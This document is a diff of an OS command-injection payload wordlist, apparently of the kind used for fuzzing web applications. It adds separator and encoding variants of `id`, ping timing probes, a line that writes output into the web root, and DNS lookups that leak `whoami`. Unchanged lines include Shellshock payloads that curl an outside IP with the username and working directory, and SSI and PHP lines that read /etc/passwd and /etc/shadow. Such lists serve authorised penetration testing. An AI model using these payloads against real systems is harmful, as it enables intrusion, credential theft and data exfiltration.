@@ -16,6 +16,11 @@
 |id;
 ||/usr/bin/id;
 ;id|
+!id!
+%id%
+||id||
+!id
+%id
 ;|/usr/bin/id|
 \n/bin/ls -al\n
 \n/usr/bin/id\n
@@ -63,11 +68,22 @@ a|/usr/bin/id
 & ping -n 30 127.0.0.1 &
 %0a ping -i 30 127.0.0.1 %0a
 `ping 127.0.0.1`
-| id
-& id
-; id
-%0a id %0a
+-c 10 127.0.0.1
+-c 10 google.com
+x||ping+-c+10+127.0.0.1||
+||ping+-c+10+127.0.0.1||
+||id>/var/www/html/id.txt||
+||nslookup+www.nsa.gov||
+x&&ping+-c+10+127.0.0.1||
+&&ping+-c+10+127.0.0.1&&
+|id
+&id
+;id
+||id
+&&id
+%0aid%0a
 `id`
+||nslookup+`whoami`.localhost.com||
 $;/usr/bin/id
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
@@ -99,5 +115,3 @@ cat /etc/passwd
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
-<?php system("cat /etc/passwd");?> 
-%00{.exec|ping 127.0.0.1
